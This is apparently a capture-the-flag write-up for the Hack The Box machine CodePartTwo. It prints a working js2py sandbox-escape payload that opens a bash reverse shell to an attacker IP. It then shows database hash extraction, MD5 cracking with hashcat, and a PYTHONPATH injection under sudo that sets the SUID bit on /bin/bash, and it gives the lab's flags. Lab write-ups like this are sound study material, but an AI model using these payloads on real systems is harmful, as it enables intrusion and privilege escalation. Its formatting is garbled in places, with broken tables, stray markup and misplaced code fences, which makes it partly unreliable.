# CTF Write-up: CodePartTwo - From Sandbox Escape to Root
This write-up documents the full exploitation path for the Hack The Box challenge CodePartTwo ($\text{10.10.11.82}$), covering RCE via a $\text{js2py}$ sandbox escape and subsequent privilege escalation via a $\text{PYTHONPATH}$ injection.
Target SummaryComponentDetailTarget IP$\text{10.10.11.82}$User Flag$\text{bed6fb5732c1b987b326b306dcf628fe}$Root Flag$\text{c0de3b54d6bfc601abc910725404f115}$Initial Foothold$\text{js2py}$ Sandbox Escape (RCE)Privilege Escalation$\text{SUDO NOPASSWD}$ on Python wrapper (npbackup-cli)
### 1. Initial Reconnaissance and Code Discovery
The initial Nmap scan showed $\text{Gunicorn 20.0.4}$ hosting a web application on port $\text{8000}$. The application allowed users to store and run JavaScript code.Initial attempts to exploit the $\text{/run\_code}$ endpoint using standard Node.js sandbox escapes failed.
A quick directory enumeration revealed an internal $\text{/download}$ endpoint serving the source code as $\text{app.zip}$, which contained the $\text{app.py}$ file.Analysis of $\text{app.py}$ revealed two critical vulnerabilities:Code Execution Sandbox: JavaScript was executed using the Python library 1$\text{js2py}$ via 2$\text{js2py.eval\_js(code)}$, making it a 3$\text{js2py}$ sandbox escape target.

### 2. User Foothold:
 $\text{js2py}$ RCE and Reverse ShellInstead of exploiting the Flask secret key, the path chosen was the more direct $\text{js2py}$ sandbox escape, which gives full shell access immediately.Exploit Code ($\text{js2py}$ Sandbox Escape) A known $\text{js2py}$ sandbox escape technique was adapted (related to $\text{CVE-2024-28397}$), leveraging Python object introspection to access the subprocess module and execute a reverse shell command.The following payload was formatted into a single line, $\text{JSON}$-encoded, and $\text{POSTed}$ to the $\text{/run\_code}$ endpoint.Note: The IP address $\text{10.10.14.145}$ and port $\text{4444}$ were used for the attacker's machine.

```Javascript 
cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.145/4444 0>&1' ";
let hacked, bymarve, n11
let getattr, obj
hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__
function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}
n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```
Execution:Listener was set up: nc -lvnp 4444Payload was sent, resulting in a shell as the app user.User Flag RetrievalInitial enumeration as the $\text{app}$ user revealed the database and a local user named $\text{marco}$ in the file system.The local database was queried (after locating the correct instance file: /home/app/app/instance/users.db): sqlite3 /home/app/app/instance/users.db "SELECT id, username, password_hash FROM user;"The hash for the $\text{marco}$ user (id=1) was found: 649c9d65a206a75f5abe509fe128bce5.

### 3. Privilege Escalation to $\text{Root}$Password CrackingThe MD5 hash was cracked using Hashcat:Bashhashcat -m 0 649c9d65a206a75f5abe509fe128bce5 /path/to/rockyou.txt

This password was used to switch user to $\text{marco}$, granting access to the home directory and the user flag:

```Bash
su marco
```
Final Root Exploit via $\text{PYTHONPATH}$ InjectionAs $\text{marco}$, the $\text{sudo}$ permissions were checked, revealing the final vector:
```Bash
sudo -l
# Output: (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```
Since the target was a Python script wrapper, a $\text{PYTHONPATH}$ injection was performed to execute arbitrary code as root.Exploit Setup: A malicious package (npbackup) was created in /tmp/ that would set the SUID bit on /bin/bash when executed.
```Bash
mkdir /tmp/np_exploit
mkdir /tmp/np_exploit/npbackup

# Payload to set SUID bit on Bash
```bash
echo '#!/usr/bin/python3' > /tmp/np_exploit/npbackup/__main__.py
echo 'import os; os.system("chmod u+s /bin/bash")' >> /tmp/np_exploit/npbackup/__main__.py
chmod +x /tmp/np_exploit/npbackup/__main__.py
Exploit Execution: The npbackup-cli script was executed with the environment set to prioritize the malicious package:BashPYTHONPATH=/tmp/np_exploit/ sudo /usr/local/bin/npbackup-cli
Root Shell: The exploit successfully set the SUID bit. A new shell was launched using the privileged binary:Bash/bin/bash -p
whoami

# Output: root
```
### 4. Final Flag RetrievalWith a root shell, the final flag was retrieved:
```Bash
cat /root/root.txt
# Root Flag: c0de3b54d6bfc601abc910725404f115
```
